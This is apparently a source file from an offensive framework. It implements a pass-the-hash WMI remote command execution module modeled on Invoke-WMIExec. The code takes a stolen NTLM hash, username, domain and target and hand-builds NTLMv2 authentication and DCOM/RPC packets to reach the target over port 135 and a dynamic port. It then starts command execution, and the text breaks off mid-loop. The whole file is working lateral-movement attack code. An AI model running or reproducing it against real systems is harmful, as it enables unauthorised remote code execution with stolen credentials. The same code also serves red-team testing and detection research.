/*
    This module is inspired from Invoke-WMIExec
    Powershell :  https://github.com/Kevin-Robertson/Invoke-TheHash
    C# :          https://github.com/checkymander/Sharp-WMIExec
    Thanks to @kevin_robertson and @checkymander
*/

import System
import System.Net
import System.Threading
import System.Security.Cryptography
import System.Diagnostics
import System.Net.Sockets
import System.Collections.Specialized
import System.Collections.Generic
import System.Linq
import System.Text
import System.Collections

public static def Main():

    error_code_array as (string)
    error_code as string

    # User params
    command as string = "COMMAND"
    hash as string = "HASH"
    username as string = "USERNAME"
    domain as string = "DOMAIN"
    target as string = "TARGET"

    # Tracking Params
    output_username = ''
    debugging as bool = false
    processID = ''
    target_short = ''
    sleep as int = 15
    show_help = false
    request_length = 0
    WMI_execute = false
    sequence_number_counter = 0
    request_split_index_tracker = 0
    WMI_client_send as (byte)
    WMI_random_port_string as string = null
    target_long = ''
    WMI_random_port_int = 0
    target_type as IPAddress = null
    object_UUID as (byte) = null
    IPID as (byte) = null
    WMI_client_stage = ''
    WMI_data = ''
    OXID = ''
    OXID_index = 0
    OXID_bytes_index = 0
    object_UUID2 as (byte) = null
    sequence_number as (byte) = null
    request_flags as (byte) = null
    request_auth_padding = 0
    request_call_ID as (byte) = null
    request_opnum as (byte) = null
    request_UUID as (byte) = null
    request_context_ID as (byte) = null
    alter_context_call_ID as (byte) = null
    alter_context_context_ID as (byte) = null
    alter_context_UUID as (byte) = null
    hostname_length as (byte) = null
    stub_data as (byte) = null
    WMI_namespace_length as (byte) = null
    WMI_namespace_unicode as (byte) = null
    IPID2 as (byte) = null
    request_split_stage = 0

    if not string.IsNullOrEmpty(command):
      WMI_execute = true

    if (not string.IsNullOrEmpty(hash)) and (not string.IsNullOrEmpty(username)):
      if debugging == true:
        print "Checking Hash Value \nCurrent Hash: " + hash
      if hash.Contains(':'):
        hash = hash.Split(char(':')).Last()

    # Check to see if domain is empty, if it's not update the username, if it is just keep the username
    if not string.IsNullOrEmpty(domain):
      output_username = ((domain + char('\\')) + username)
    else:
      output_username = username

    if target == 'localhost':
      target = '127.0.0.1'
      target_long = '127.0.0.1'
    try:
      target_type = IPAddress.Parse(target)
      target_short = (target_long = target)
    except :
      target_long = target
      if target.Contains('.'):
        target_short_index as int = target.IndexOf('.')
        target_short = target.Substring(0, target_short_index)
      else:
        target_short = target

    processID = Process.GetCurrentProcess().Id.ToString()
    process_ID_Bytes as (byte) = BitConverter.GetBytes(int.Parse(processID))
    processID = BitConverter.ToString(process_ID_Bytes)
    processID = processID.Replace('-00-00', '').Replace('-', '')
    process_ID_Bytes = StringToByteArray(processID)
    print "Connecting to " + target + ":135"
    WMI_client_init = TcpClient()
    WMI_client_init.Client.ReceiveTimeout = 30000

    try:
      WMI_client_init.Connect(target, 135)
    except :
      print target + " did not respond."

    if WMI_client_init.Connected:
      WMI_client_stream_init as NetworkStream = WMI_client_init.GetStream()
      WMI_client_receive as (byte) = array(byte, 2048)
      RPC_UUID as (byte) = (of byte: 196, 254, 252, 153, 96, 82, 27, 16, 187, 203, 0, 170, 0, 33, 52, 122)
      packet_RPC as OrderedDictionary = GetPacketRPCBind(2, (of byte: 208, 22), (of byte: 2), (of byte: 0, 0), RPC_UUID, (of byte: 0, 0))
      packet_RPC['RPCBind_FragLength'] = (of byte: 116, 0)
      RPC as (byte) = ConvertFromPacketOrderedDictionary(packet_RPC)
      WMI_client_send = RPC
      WMI_client_stream_init.Write(WMI_client_send, 0, WMI_client_send.Length)
      WMI_client_stream_init.Flush()
      WMI_client_stream_init.Read(WMI_client_receive, 0, WMI_client_receive.Length)
      assoc_group as (byte) = getByteRange(WMI_client_receive, 20, 23)
      packet_RPC = GetPacketRPCRequest((of byte: 3), 0, 0, 0, (of byte: 2, 0, 0, 0), (of byte: 0, 0), (of byte: 5, 0), null)
      RPC = ConvertFromPacketOrderedDictionary(packet_RPC)
      WMI_client_send = RPC
      WMI_client_stream_init.Write(WMI_client_send, 0, WMI_client_send.Length)
      WMI_client_stream_init.Flush()
      WMI_client_stream_init.Read(WMI_client_receive, 0, WMI_client_receive.Length)
      WMI_hostname_unicode as (byte) = getByteRange(WMI_client_receive, 42, WMI_client_receive.Length)
      WMI_hostname as string = BitConverter.ToString(WMI_hostname_unicode)
      WMI_hostname_index as int = WMI_hostname.IndexOf('-00-00-00')
      WMI_hostname = WMI_hostname.Substring(0, WMI_hostname_index).Replace('-00', '')
      #Need to figure out what's done with the WMI_hostname here.
      WMI_hostname_bytes as (byte) = StringToByteArray(WMI_hostname.Replace('-', '').Replace(' ', ''))
      WMI_hostname_bytes = getByteRange(WMI_hostname_bytes, 0, WMI_hostname_bytes.Length)
      WMI_hostname = Encoding.ASCII.GetString(WMI_hostname_bytes)

      if target_short != WMI_hostname:
        if debugging == true:
          print "WMI reports target hostname as " + WMI_hostname
        target_short = WMI_hostname

      WMI_client_init.Close()
      WMI_client_stream_init.Close()
      WMI_client = TcpClient()
      WMI_client.Client.ReceiveTimeout = 30000
      WMI_client_stream as NetworkStream = null
      try:
        WMI_client.Connect(target_long, 135)
        if debugging == true:
          print "Connected to " + target_long
      except :
        print target_long + " did not respond"

      if WMI_client.Connected:
        print "WMI_client is connected"
        WMI_client_stream = WMI_client.GetStream()
        RPC_UUID = (of byte: 160, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70)
        packet_RPC = GetPacketRPCBind(3, (of byte: 208, 22), (of byte: 1), (of byte: 1, 0), RPC_UUID, (of byte: 0, 0))
        packet_RPC['RPCBind_FragLength'] = (of byte: 120, 0)
        packet_RPC['RPCBind_AuthLength'] = (of byte: 40, 0)
        packet_RPC['RPCBind_NegotiateFlags'] = (of byte: 7, 130, 8, 162)
        RPC = ConvertFromPacketOrderedDictionary(packet_RPC)
        WMI_client_send = RPC
        WMI_client_stream.Write(WMI_client_send, 0, WMI_client_send.Length)
        WMI_client_stream.Flush()
        WMI_client_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length)
        assoc_group = getByteRange(WMI_client_receive, 20, 23)
        WMI_NTLMSSP as string = BitConverter.ToString(WMI_client_receive)
        WMI_NTLMSSP = WMI_NTLMSSP.Replace('-', '')
        WMI_NTLMSSP_index as int = WMI_NTLMSSP.IndexOf('4E544C4D53535000')
        WMI_NTLMSSP_bytes_index as int = (WMI_NTLMSSP_index / 2)
        WMI_domain_length as int = DataLength2((WMI_NTLMSSP_bytes_index + 12), WMI_client_receive)
        WMI_target_length as int = DataLength2((WMI_NTLMSSP_bytes_index + 40), WMI_client_receive)
        WMI_session_ID as (byte) = getByteRange(WMI_client_receive, 44, 51)
        WMI_NTLM_challenge as (byte) = getByteRange(WMI_client_receive, (WMI_NTLMSSP_bytes_index + 24), (WMI_NTLMSSP_bytes_index + 31))
        WMI_target_details as (byte) = getByteRange(WMI_client_receive, ((WMI_NTLMSSP_bytes_index + 56) + WMI_domain_length), (((WMI_NTLMSSP_bytes_index + 55) + WMI_domain_length) + WMI_target_length))
        WMI_target_time_bytes as (byte) = getByteRange(WMI_target_details, (WMI_target_details.Length - 12), (WMI_target_details.Length - 5))
        hash2 = ''
        for i in range(0, (hash.Length - 1), 2):
          hash2 += (hash.Substring(i, 2) + '-')
        NTLM_hash_bytes as (byte) = StringToByteArray(hash.Replace('-', ''))
        hash_string_array as (string) = hash2.Split(char('-'))
        auth_hostname as string = Environment.MachineName
        auth_hostname_bytes as (byte) = Encoding.Unicode.GetBytes(auth_hostname)
        auth_domain_bytes as (byte) = Encoding.Unicode.GetBytes(domain)
        auth_username_bytes as (byte) = Encoding.Unicode.GetBytes(username)
        auth_domain_length as (byte) = BitConverter.GetBytes(auth_domain_bytes.Length)
        auth_domain_length = (of byte: auth_domain_length[0], auth_domain_length[1])
        auth_username_length as (byte) = BitConverter.GetBytes(auth_username_bytes.Length)
        auth_username_length = (of byte: auth_username_length[0], auth_username_length[1])
        auth_hostname_length as (byte) = BitConverter.GetBytes(auth_hostname_bytes.Length)
        auth_hostname_length = (of byte: auth_hostname_length[0], auth_hostname_length[1])
        auth_domain_offset as (byte) = (of byte: 64, 0, 0, 0)
        auth_username_offset as (byte) = BitConverter.GetBytes((auth_domain_bytes.Length + 64))
        auth_hostname_offset as (byte) = BitConverter.GetBytes(((auth_domain_bytes.Length + auth_username_bytes.Length) + 64))
        auth_LM_offset as (byte) = BitConverter.GetBytes((((auth_domain_bytes.Length + auth_username_bytes.Length) + auth_hostname_bytes.Length) + 64))
        auth_NTLM_offset as (byte) = BitConverter.GetBytes((((auth_domain_bytes.Length + auth_username_bytes.Length) + auth_hostname_bytes.Length) + 88))
        HMAC_MD5 = HMACMD5()
        HMAC_MD5.Key = NTLM_hash_bytes
        username_and_target as string = username.ToUpper()
        username_bytes as (byte) = Encoding.Unicode.GetBytes(username_and_target)
        username_and_target_bytes as (byte) = null
        username_and_target_bytes = CombineByteArray(username_bytes, auth_domain_bytes)
        NTLMv2_hash as (byte) = HMAC_MD5.ComputeHash(username_and_target_bytes)
        r = Random()
        client_challenge_bytes as (byte) = array(byte, 8)
        r.NextBytes(client_challenge_bytes)
        security_blob_bytes as (byte) = null
        security_blob_bytes = CombineByteArray((of byte: 1, 1, 0, 0, 0, 0, 0, 0), WMI_target_time_bytes)
        security_blob_bytes = CombineByteArray(security_blob_bytes, client_challenge_bytes)
        security_blob_bytes = CombineByteArray(security_blob_bytes, (of byte: 0, 0, 0, 0))
        security_blob_bytes = CombineByteArray(security_blob_bytes, WMI_target_details)
        security_blob_bytes = CombineByteArray(security_blob_bytes, (of byte: 0, 0, 0, 0, 0, 0, 0, 0))
        server_challenge_and_security_blob_bytes as (byte) = CombineByteArray(WMI_NTLM_challenge, security_blob_bytes)
        HMAC_MD5.Key = NTLMv2_hash
        NTLMv2_response as (byte) = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes)
        session_base_key as (byte) = HMAC_MD5.ComputeHash(NTLMv2_response)
        NTLMv2_response = CombineByteArray(NTLMv2_response, security_blob_bytes)
        NTLMv2_response_length as (byte) = BitConverter.GetBytes(NTLMv2_response.Length)
        NTLMv2_response_length = (of byte: NTLMv2_response_length[0], NTLMv2_response_length[1])
        WMI_session_key_offset as (byte) = BitConverter.GetBytes(((((auth_domain_bytes.Length + auth_username_bytes.Length) + auth_hostname_bytes.Length) + NTLMv2_response.Length) + 88))
        WMI_session_key_length as (byte) = (of byte: 0, 0)
        WMI_negotiate_flags as (byte) = (of byte: 21, 130, 136, 162)
        NTLMSSP_response as (byte) = null
        NTLMSSP_response = CombineByteArray((of byte: 78, 84, 76, 77, 83, 83, 80, 0, 3, 0, 0, 0, 24, 0, 24, 0), auth_LM_offset)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response_length)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response_length)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_NTLM_offset)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_length)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_length)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_offset)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_length)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_length)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_offset)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_length)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_length)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_offset)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_length)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_length)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_offset)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_negotiate_flags)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_bytes)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_bytes)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_bytes)
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, (of byte: 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
        NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response)
        assoc_group = getByteRange(WMI_client_receive, 20, 23)
        packet_RPC = GetPacketRPCAuth3(NTLMSSP_response)
        RPC = ConvertFromPacketOrderedDictionary(packet_RPC)
        WMI_client_send = RPC
        WMI_client_stream.Write(WMI_client_send, 0, WMI_client_send.Length)
        WMI_client_stream.Flush()
        causality_ID_bytes as (byte) = array(byte, 16)
        r.NextBytes(causality_ID_bytes)
        packet_DCOM_remote_create_instance as OrderedDictionary = GetPacketDCOMRemoteCreateInstance(causality_ID_bytes, target_short)
        DCOM_remote_create_instance as (byte) = ConvertFromPacketOrderedDictionary(packet_DCOM_remote_create_instance)
        packet_RPC = GetPacketRPCRequest((of byte: 3), DCOM_remote_create_instance.Length, 0, 0, (of byte: 3, 0, 0, 0), (of byte: 1, 0), (of byte: 4, 0), null)
        RPC = ConvertFromPacketOrderedDictionary(packet_RPC)
        WMI_client_send = CombineByteArray(RPC, DCOM_remote_create_instance)
        WMI_client_stream.Write(WMI_client_send, 0, WMI_client_send.Length)
        WMI_client_stream.Flush()
        WMI_client_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length)
        if debugging == true:
          print"Switching to randomized port"
        WMI_client_random_port = TcpClient()
        WMI_client_random_port.Client.ReceiveTimeout = 30000
        if (WMI_client_receive[2] == 3) and (BitConverter.ToString(getByteRange(WMI_client_receive, 24, 27)) == '05-00-00-00'):
          print output_username + "WMI access denied on" + target_long
        elif WMI_client_receive[2] == 3:
          error_code = BitConverter.ToString((of byte: WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24]))
          error_code_array = error_code.Split(char('-'))
          error_code = string.Join('', error_code_array)
          print "Error Code: 0x" + error_code.ToString()
        elif (WMI_client_receive[2] == 2) and (not WMI_execute):
          print output_username + " accessed WMI on " + target_long
        elif (WMI_client_receive[2] == 2) and WMI_execute:
          print output_username + " accessed WMI on " + target_long
          if target_short == '127.0.0.1':
            target_short = auth_hostname
          target_unicode as (byte) = CombineByteArray((of byte: 7, 0), Encoding.Unicode.GetBytes((target_short + '[')))
          target_search as string = BitConverter.ToString(target_unicode).Replace('-', '')
          WMI_message as string = BitConverter.ToString(WMI_client_receive).Replace('-', '')
          target_index as int = WMI_message.IndexOf(target_search)
          if target_index < 1:
            target_address_list as (IPAddress) = Dns.GetHostEntry(target_long).AddressList
            for ip as IPAddress in target_address_list:
              target_short = ip.Address.ToString()
              if debugging == true:
                print target_short
              target_unicode = CombineByteArray((of byte: 7, 0), Encoding.Unicode.GetBytes((target_short + '[')))
              target_search = BitConverter.ToString(target_unicode).Replace('-', '')
              target_index = WMI_message.IndexOf(target_search)
              if target_index >= 0:
                break
          if target_long != target_short:
            if debugging == true:
              print "Using " + target_short + " for random port extraction"
          if target_index > 0:
            target_bytes_index as int = (target_index / 2)
            WMI_random_port_bytes as (byte) = getByteRange(WMI_client_receive, (target_bytes_index + target_unicode.Length), ((target_bytes_index + target_unicode.Length) + 8))
            WMI_random_port_string = BitConverter.ToString(WMI_random_port_bytes)
            WMI_random_port_end_index as int = WMI_random_port_string.IndexOf('-5D')
            if WMI_random_port_end_index > 0:
              WMI_random_port_string = WMI_random_port_string.Substring(0, WMI_random_port_end_index)
            WMI_random_port_string = WMI_random_port_string.Replace('-00', '').Replace('-', '')
            random_port_char_array as (char) = WMI_random_port_string.ToCharArray()
            chars as (char) = (of char: random_port_char_array[1], random_port_char_array[3], random_port_char_array[5], random_port_char_array[7], random_port_char_array[9])
            WMI_random_port_int = int.Parse(string(chars))
            meow as string = BitConverter.ToString(WMI_client_receive).Replace('-', '')
            meow_index as int = meow.IndexOf('4D454F570100000018AD09F36AD8D011A07500C04FB68820')
            meow_bytes_index as int = (meow_index / 2)
            if debugging == true:
              print "meow_index: "+ meow_index + "\nmeow_bytes_index: "+ meow_bytes_index
            OXID_bytes as (byte) = getByteRange(WMI_client_receive, (meow_bytes_index + 32), (meow_bytes_index + 39))
            IPID = getByteRange(WMI_client_receive, (meow_bytes_index + 48), (meow_bytes_index + 63))
            OXID = BitConverter.ToString(OXID_bytes).Replace('-', '')
            OXID_index = meow.IndexOf(OXID, (meow_index + 100))
            OXID_bytes_index = (OXID_index / 2)
            object_UUID = getByteRange(WMI_client_receive, (OXID_bytes_index + 12), (OXID_bytes_index + 27))
          if WMI_random_port_int != 0:
            print "Connecting to " + target_long + ":" + WMI_random_port_int
            try:
              WMI_client_random_port.Connect(target_long, WMI_random_port_int)
            except :
              print target_long + ":" + WMI_random_port_int + " did not response"
          else:
            print "Random port extraction failure"
        else:
          print "Something went wrong"
        if WMI_client_random_port.Connected:
          WMI_client_random_port_stream as NetworkStream = WMI_client_random_port.GetStream()
          packet_RPC = GetPacketRPCBind(2, (of byte: 208, 22), (of byte: 3), (of byte: 0, 0), (of byte: 67, 1, 0, 0, 0, 0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70), (of byte: 0, 0))
          packet_RPC['RPCBind_FragLength'] = (of byte: 208, 0)
          packet_RPC['RPCBind_AuthLength'] = (of byte: 40, 0)
          packet_RPC['RPCBind_NegotiateFlags'] = (of byte: 151, 130, 8, 162)
          RPC = ConvertFromPacketOrderedDictionary(packet_RPC)
          WMI_client_send = RPC
          WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length)
          WMI_client_random_port_stream.Flush()
          WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length)
          assoc_group = getByteRange(WMI_client_receive, 20, 23)
          WMI_NTLMSSP = BitConverter.ToString(WMI_client_receive)
          WMI_NTLMSSP = WMI_NTLMSSP.Replace('-', '')
          WMI_NTLMSSP_index = WMI_NTLMSSP.IndexOf('4E544C4D53535000')
          WMI_NTLMSSP_bytes_index = (WMI_NTLMSSP_index / 2)
          WMI_domain_length = DataLength2((WMI_NTLMSSP_bytes_index + 12), WMI_client_receive)
          WMI_target_length = DataLength2((WMI_NTLMSSP_bytes_index + 40), WMI_client_receive)
          WMI_session_ID = getByteRange(WMI_client_receive, 44, 51)
          WMI_NTLM_challenge = getByteRange(WMI_client_receive, (WMI_NTLMSSP_bytes_index + 24), (WMI_NTLMSSP_bytes_index + 31))
          WMI_target_details = getByteRange(WMI_client_receive, ((WMI_NTLMSSP_bytes_index + 56) + WMI_domain_length), (((WMI_NTLMSSP_bytes_index + 55) + WMI_domain_length) + WMI_target_length))
          WMI_target_time_bytes = getByteRange(WMI_target_details, (WMI_target_details.Length - 12), (WMI_target_details.Length - 5))
          hash2 = ''
          for i in range(0, (hash.Length - 1), 2):
            hash2 += (hash.Substring(i, 2) + '-')
          NTLM_hash_bytes = StringToByteArray(hash.Replace('-', ''))
          hash_string_array = hash2.Split(char('-'))
          auth_hostname = Environment.MachineName
          auth_hostname_bytes = Encoding.Unicode.GetBytes(auth_hostname)
          auth_domain_bytes = Encoding.Unicode.GetBytes(domain)
          auth_username_bytes = Encoding.Unicode.GetBytes(username)
          auth_domain_length = BitConverter.GetBytes(auth_domain_bytes.Length)
          auth_domain_length = (of byte: auth_domain_length[0], auth_domain_length[1])
          auth_username_length = BitConverter.GetBytes(auth_username_bytes.Length)
          auth_username_length = (of byte: auth_username_length[0], auth_username_length[1])
          auth_hostname_length = BitConverter.GetBytes(auth_hostname_bytes.Length)
          auth_hostname_length = (of byte: auth_hostname_length[0], auth_hostname_length[1])
          auth_domain_offset = (of byte: 64, 0, 0, 0)
          auth_username_offset = BitConverter.GetBytes((auth_domain_bytes.Length + 64))
          auth_hostname_offset = BitConverter.GetBytes(((auth_domain_bytes.Length + auth_username_bytes.Length) + 64))
          auth_LM_offset = BitConverter.GetBytes((((auth_domain_bytes.Length + auth_username_bytes.Length) + auth_hostname_bytes.Length) + 64))
          auth_NTLM_offset = BitConverter.GetBytes((((auth_domain_bytes.Length + auth_username_bytes.Length) + auth_hostname_bytes.Length) + 88))
          HMAC_MD5 = HMACMD5()
          HMAC_MD5.Key = NTLM_hash_bytes
          username_and_target = username.ToUpper()
          username_bytes = Encoding.Unicode.GetBytes(username_and_target)
          username_and_target_bytes = null
          username_and_target_bytes = CombineByteArray(username_bytes, auth_domain_bytes)
          NTLMv2_hash = HMAC_MD5.ComputeHash(username_and_target_bytes)
          r = Random()
          client_challenge_bytes = array(byte, 8)
          r.NextBytes(client_challenge_bytes)
          security_blob_bytes = null
          security_blob_bytes = CombineByteArray((of byte: 1, 1, 0, 0, 0, 0, 0, 0), WMI_target_time_bytes)
          security_blob_bytes = CombineByteArray(security_blob_bytes, client_challenge_bytes)
          security_blob_bytes = CombineByteArray(security_blob_bytes, (of byte: 0, 0, 0, 0))
          security_blob_bytes = CombineByteArray(security_blob_bytes, WMI_target_details)
          security_blob_bytes = CombineByteArray(security_blob_bytes, (of byte: 0, 0, 0, 0, 0, 0, 0, 0))
          server_challenge_and_security_blob_bytes = CombineByteArray(WMI_NTLM_challenge, security_blob_bytes)
          HMAC_MD5.Key = NTLMv2_hash
          NTLMv2_response = HMAC_MD5.ComputeHash(server_challenge_and_security_blob_bytes)
          session_base_key = HMAC_MD5.ComputeHash(NTLMv2_response)
          client_signing_constant as (byte) = (of byte: 115, 101, 115, 115, 105, 111, 110, 32, 107, 101, 121, 32, 116, 111, 32, 99, 108, 105, 101, 110, 116, 45, 116, 111, 45, 115, 101, 114, 118, 101, 114, 32, 115, 105, 103, 110, 105, 110, 103, 32, 107, 101, 121, 32, 109, 97, 103, 105, 99, 32, 99, 111, 110, 115, 116, 97, 110, 116, 0)
          MD5_crypto = MD5CryptoServiceProvider()
          client_signing_key as (byte) = MD5_crypto.ComputeHash(CombineByteArray(session_base_key, client_signing_constant))
          NTLMv2_response = CombineByteArray(NTLMv2_response, security_blob_bytes)
          NTLMv2_response_length = BitConverter.GetBytes(NTLMv2_response.Length)
          NTLMv2_response_length = (of byte: NTLMv2_response_length[0], NTLMv2_response_length[1])
          WMI_session_key_offset = BitConverter.GetBytes(((((auth_domain_bytes.Length + auth_username_bytes.Length) + auth_hostname_bytes.Length) + NTLMv2_response.Length) + 88))
          WMI_session_key_length = (of byte: 0, 0)
          WMI_negotiate_flags = (of byte: 21, 130, 136, 162)
          NTLMSSP_response = null
          NTLMSSP_response = CombineByteArray((of byte: 78, 84, 76, 77, 83, 83, 80, 0, 3, 0, 0, 0, 24, 0, 24, 0), auth_LM_offset)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response_length)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response_length)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_NTLM_offset)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_length)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_length)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_offset)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_length)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_length)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_offset)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_length)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_length)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_offset)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_length)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_length)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_session_key_offset)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, WMI_negotiate_flags)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_domain_bytes)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_username_bytes)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, auth_hostname_bytes)
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, (of byte: 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
          NTLMSSP_response = CombineByteArray(NTLMSSP_response, NTLMv2_response)
          HMAC_MD5.Key = client_signing_key
          sequence_number = (of byte: 0, 0, 0, 0)
          packet_RPC = GetPacketRPCAuth3(NTLMSSP_response)
          packet_RPC['RPCAUTH3_CallID'] = (of byte: 2, 0, 0, 0)
          packet_RPC['RPCAUTH3_AuthLevel'] = (of byte: 4)
          RPC = ConvertFromPacketOrderedDictionary(packet_RPC)
          WMI_client_send = RPC
          WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length)
          WMI_client_random_port_stream.Flush()
          packet_RPC = GetPacketRPCRequest((of byte: 131), 76, 16, 4, (of byte: 2, 0, 0, 0), (of byte: 0, 0), (of byte: 3, 0), object_UUID)
          packet_rem_query_interface as OrderedDictionary = GetPacketDCOMRemQueryInterface(causality_ID_bytes, IPID, (of byte: 214, 28, 120, 212, 211, 229, 223, 68, 173, 148, 147, 14, 254, 72, 168, 135))
          packet_NTLMSSP_verifier as OrderedDictionary = GetPacketNTLMSSPVerifier(4, (of byte: 4), sequence_number)
          RPC = ConvertFromPacketOrderedDictionary(packet_RPC)
          rem_query_interface as (byte) = ConvertFromPacketOrderedDictionary(packet_rem_query_interface)
          NTLMSSP_verifier as (byte) = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier)
          HMAC_MD5.Key = client_signing_key
          RPC_Sign as (byte) = CombineByteArray(sequence_number, RPC)
          RPC_Sign = CombineByteArray(RPC_Sign, rem_query_interface)
          RPC_Sign = CombineByteArray(RPC_Sign, getByteRange(NTLMSSP_verifier, 0, 11))
          RPC_signature as (byte) = HMAC_MD5.ComputeHash(RPC_Sign)
          RPC_signature = getByteRange(RPC_signature, 0, 7)
          packet_NTLMSSP_verifier['NTLMSSPVerifier_NTLMSSPVerifierChecksum'] = RPC_signature
          NTLMSSP_verifier = ConvertFromPacketOrderedDictionary(packet_NTLMSSP_verifier)
          WMI_client_send = CombineByteArray(RPC, rem_query_interface)
          WMI_client_send = CombineByteArray(WMI_client_send, NTLMSSP_verifier)
          WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length)
          WMI_client_random_port_stream.Flush()
          WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length)
          WMI_client_stage = 'exit'
          if (WMI_client_receive[2] == 3) and (BitConverter.ToString(getByteRange(WMI_client_receive, 24, 27)) == '05-00-00-00'):
            print output_username + " WMI access denied on " + target_long
          elif (WMI_client_receive[2] == 3) and (BitConverter.ToString(getByteRange(WMI_client_receive, 24, 27)) != '05-00-00-00'):
            error_code = BitConverter.ToString((of byte: WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24]))
            error_code_array = error_code.Split(char('-'))
            error_code = string.Join('', error_code_array)
            print "Error Code: 0x" + error_code.ToString()
          elif WMI_client_receive[2] == 2:
            WMI_data = BitConverter.ToString(WMI_client_receive).Replace('-', '')
            OXID_index = WMI_data.IndexOf(OXID)
            OXID_bytes_index = (OXID_index / 2)
            object_UUID2 = getByteRange(WMI_client_receive, (OXID_bytes_index + 16), (OXID_bytes_index + 31))
            WMI_client_stage = 'AlterContext'
          else:
            print "Something went wrong"
          print "Attempting command execution"
          request_split_index = 5500
          WMI_client_stage_next = ''
          request_split = false
          while WMI_client_stage != 'exit':
            if WMI_client_receive[2] == 3:
              error_code = BitConverter.ToString((of byte: WMI_client_receive[27], WMI_client_receive[26], WMI_client_receive[25], WMI_client_receive[24]))
              error_code_array = error_code.Split(char('-'))
              error_code = string.Join('', error_code_array)
              print "Execution failed with error code: 0x" + error_code.ToString()
              WMI_client_stage = 'exit'
            converterGeneratedName1 = WMI_client_stage
            if converterGeneratedName1 == 'AlterContext':
              converterGeneratedName2 = sequence_number[0]
              if converterGeneratedName2 == 0:
                alter_context_call_ID = (of byte: 3, 0, 0, 0)
                alter_context_context_ID = (of byte: 2, 0)
                alter_context_UUID = (of byte: 214, 28, 120, 212, 211, 229, 223, 68, 173, 148, 147, 14, 254, 72, 168, 135)
                WMI_client_stage_next = 'Request'
              elif converterGeneratedName2 == 1:
                alter_context_call_ID = (of byte: 4, 0, 0, 0)
                alter_context_context_ID = (of byte: 3, 0)
                alter_context_UUID = (of byte: 24, 173, 9, 243, 106, 216, 208, 17, 160, 117, 0, 192, 79, 182, 136, 32)
                WMI_client_stage_next = 'Request'
              elif converterGeneratedName2 == 6:
                alter_context_call_ID = (of byte: 9, 0, 0, 0)
                alter_context_context_ID = (of byte: 4, 0)
                alter_context_UUID = (of byte: 153, 220, 86, 149, 140, 130, 207, 17, 163, 126, 0, 170, 0, 50, 64, 199)
                WMI_client_stage_next = 'Request'
              packet_RPC = GetPacketRPCAlterContext(assoc_group, alter_context_call_ID, alter_context_context_ID, alter_context_UUID)
              RPC = ConvertFromPacketOrderedDictionary(packet_RPC)
              WMI_client_send = RPC
              WMI_client_random_port_stream.Write(WMI_client_send, 0, WMI_client_send.Length)
              WMI_client_random_port_stream.Flush()
              WMI_client_random_port_stream.Read(WMI_client_receive, 0, WMI_client_receive.Length)
              WMI_client_stage = WMI_client_stage_next
            elif converterGeneratedName1 == 'Request':
              converterGeneratedName3 = sequence_number[0]
              if converterGeneratedName3 == 0:
                sequence_number = (of byte: 1, 0, 0, 0)
                request_flags = (of byte: 131)
